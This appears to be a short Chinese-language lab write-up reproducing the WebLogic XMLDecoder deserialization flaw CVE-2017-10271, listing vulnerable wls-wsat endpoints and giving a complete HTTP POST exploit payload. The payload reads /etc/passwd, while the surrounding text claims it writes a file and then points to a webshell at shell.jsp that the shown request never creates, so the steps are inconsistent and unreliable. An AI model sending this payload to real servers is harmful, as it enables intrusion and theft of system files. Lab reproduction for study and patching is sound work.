# 漏洞复现WebLogic XMLDecoder反序列化(CVE-2017-10271）

## 漏洞利用

1）访问链接：http://192.168.61.129:7001/wls-wsat/CoordinatorPortType

返回如下页面，表示漏洞存在。

漏洞不仅仅存在与 /wls-wsat/CoordinatorPortType，只要是wls-wsat包中的Url皆收到影响，可以查看web.xml得知所受到影响的URl。
```
/wls-wsat/CoordinatorPortType
/wls-wsat/RegistrationPortTypeRPC
/wls-wsat/ParticipantPortType
/wls-wsat/RegistrationRequesterPortType
/wls-wsat/CoordinatorPortType11
/wls-wsat/RegistrationPortTypeRPC11
/wls-wsat/ParticipantPortType11
/wls-wsat/RegistrationRequesterPortType11
```

2）构造数据包

构造写入文件数据包发送，其中Content-Type需要等于text/xml，否则可能导致XMLDecoder不解析。
```
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: 192.168.61.129:7001
Accept-Encoding: gzip, deflate
Accept: */*Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: text/xml
Content-Length: 645
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>   
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"> 
      <java>
        <java version="1.4.0" class="java.beans.XMLDecoder"> 
          <object class="java.io.InputStreamReader">
            <void method="read">
              <object class="java.io.FileInputStream">
                <string>/etc/passwd</string>
              </object>
            </void>
          </object>
        </java>
      </java>  
    </work:WorkContext>   
  </soapenv:Header>   
  <soapenv:Body/>
</soapenv:Envelope>
```
验证webshell。

我们访问恶意路径：http://192.168.61.129:7001/bea_wls_internal/shell.jsp